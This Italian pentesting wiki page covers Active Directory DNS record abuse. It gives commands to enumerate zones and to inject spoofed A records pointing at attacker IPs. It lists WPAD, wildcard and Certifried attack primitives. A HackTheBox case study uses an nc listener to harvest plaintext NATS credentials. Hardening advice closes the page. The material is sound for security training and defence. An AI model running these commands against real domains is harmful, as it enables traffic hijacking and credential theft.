# Record DNS di AD

{{#include ../../banners/hacktricks-training.md}}

Per impostazione predefinita, **qualsiasi utente** in Active Directory può **enumerare tutti i record DNS** nelle zone DNS del Domain o della Forest, in modo simile a un trasferimento di zona (gli utenti possono elencare gli oggetti figlio di una zona DNS in un ambiente AD).

Lo strumento [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) consente di **enumerare** ed **esportare** **tutti i record DNS** della zona, a scopo di ricognizione delle reti interne.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (aprile 2025) aggiunge l'output JSON/Greppable (`--json`), la risoluzione DNS multi-thread e il supporto per TLS 1.2/1.3 durante il binding a LDAPS  

Per ulteriori informazioni, leggi [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Creazione / modifica dei record (spoofing ADIDNS)

Poiché il gruppo **Authenticated Users** dispone per impostazione predefinita del permesso **Create Child** sulla DACL della zona, qualsiasi account di dominio (o account computer) può registrare record aggiuntivi. Questo può essere usato per dirottare il traffico, forzare NTLM relay o persino compromettere completamente il dominio.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py è incluso in Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Primitive di attacco comuni

1. **Wildcard record** – `*.<zone>` trasforma il server AD DNS in un responder a livello aziendale, simile allo spoofing LLMNR/NBNS. Può essere usato per acquisire hash NTLM o inoltrarli a LDAP/SMB.  (È necessario che WINS-lookup sia disabilitato.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – aggiungere `wpad` (o un record **NS** che punti a un host dell’attaccante per aggirare la Global-Query-Block-List) e inoltrare in modo trasparente le richieste HTTP in uscita tramite un proxy per raccogliere credenziali. Microsoft ha corretto gli aggiramenti tramite wildcard/DNAME (CVE-2018-8320), ma i **record NS funzionano ancora**.<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – rivendicare l'indirizzo IP precedentemente assegnato a una workstation: la voce DNS associata continuerà a essere risolta, consentendo attacchi resource-based constrained delegation o Shadow-Credentials senza interagire affatto con il DNS.    
4. **DHCP → DNS spoofing** – in una distribuzione Windows DHCP+DNS predefinita, un attaccante non autenticato sulla stessa subnet può sovrascrivere qualsiasi record A esistente (inclusi quelli dei Domain Controller) inviando richieste DHCP contraffatte che attivano aggiornamenti DNS dinamici (Akamai “DDSpoof”, 2023).  Questo consente un attacco machine-in-the-middle su Kerberos/LDAP e può portare alla compromissione completa del dominio.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – modificare il `dNSHostName` di un account computer sotto il proprio controllo, registrare un record A corrispondente e richiedere quindi un certificato per quel nome per impersonare il DC. Strumenti come **Certipy** o **BloodyAD** automatizzano completamente la procedura.  

Un record AD DNS con [informazioni di destinazione serializzate](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) può far parte di una catena di relay condizionale: il chiamante deve disporre dei permessi per creare record, di un percorso di coercion che induca il computer di destinazione ad autenticarsi a quel nome e di una destinazione di relay che accetti l'autenticazione risultante. Valutare separatamente il protocollo di destinazione; la firma SMB sulla connessione in ingresso non determina da sola se una destinazione HTTPS WinRM accetta il relay. Il livello di patch, la gestione dei nomi, Extended Protection e la configurazione del servizio possono influire sull'esito.

---

### Hijacking di servizi interni tramite record dinamici obsoleti (caso di studio NATS)

Quando gli aggiornamenti dinamici restano aperti a tutti gli utenti autenticati, **è possibile rivendicare nuovamente un nome di servizio deregistrato e farlo puntare all'infrastruttura dell'attaccante**. Dopo il DNS scavenging, il DC Mirage HTB esponeva l'hostname `nats-svc.mirage.htb`, quindi qualsiasi utente con privilegi bassi poteva:<sup>[[3]](#references)</sup>

1. **Verificare che il record non sia presente** e individuare il SOA con `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Ricrea il record** verso un'interfaccia esterna/VPN sotto il loro controllo:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Impersona il servizio in chiaro**. I client NATS si aspettano di ricevere un banner `INFO { ... }` prima di inviare le credenziali, quindi basta copiare un banner legittimo dal broker reale per raccogliere segreti:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Qualsiasi client che risolve il nome dirottato farà immediatamente leak del proprio frame JSON `CONNECT` (inclusi `"user"`/`"pass"`) al listener. Eseguire il binario ufficiale `nats-server -V` sull'host dell'attaccante, disabilitare la redazione dei log oppure semplicemente sniffare la sessione con Wireshark restituisce le stesse credenziali in testo in chiaro, perché TLS era opzionale.

4. **Pivot con le credenziali acquisite** – in Mirage, l'account NATS sottratto forniva accesso a JetStream, che esponeva eventi di autenticazione storici contenenti username/password AD riutilizzabili.

Questo pattern si applica a ogni servizio integrato con AD che si affida a handshake TCP non protetti (API HTTP, RPC, MQTT ecc.): una volta dirottato il record DNS, l'attaccante diventa il servizio.
Per l'enumerazione lato broker e il workflow dei messaggi conservati, vedi [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Rilevamento e hardening

* Negare ad **Authenticated Users** il diritto *Create all child objects* sulle zone sensibili e delegare gli aggiornamenti dinamici a un account dedicato usato da DHCP.
* Se gli aggiornamenti dinamici sono necessari, impostare la zona su **Secure-only** e abilitare **Name Protection** in DHCP, in modo che solo l'oggetto computer proprietario possa sovrascrivere il proprio record.
* Monitorare gli ID evento del DNS Server 257/252 (aggiornamento dinamico), 770 (trasferimento di zona) e le scritture LDAP in `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloccare i nomi pericolosi (`wpad`, `isatap`, `*`) con un record intenzionalmente innocuo o tramite la Global Query Block List.
* Mantenere aggiornati i DNS server – ad esempio, le vulnerabilità RCE CVE-2024-26224 e CVE-2024-26231 hanno raggiunto **CVSS 9.8** e sono sfruttabili da remoto contro i Domain Controller.  



## References

- [1] [ADIDNS rivisitato - WPAD, GQBL e altro](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Spoofing dei record DNS abusando degli aggiornamenti dinamici DNS di DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: concatenare leak NFS, abuso del DNS dinamico, furto di credenziali NATS, segreti JetStream e Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Entrare nella zona: scaricare il DNS di Active Directory usando adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
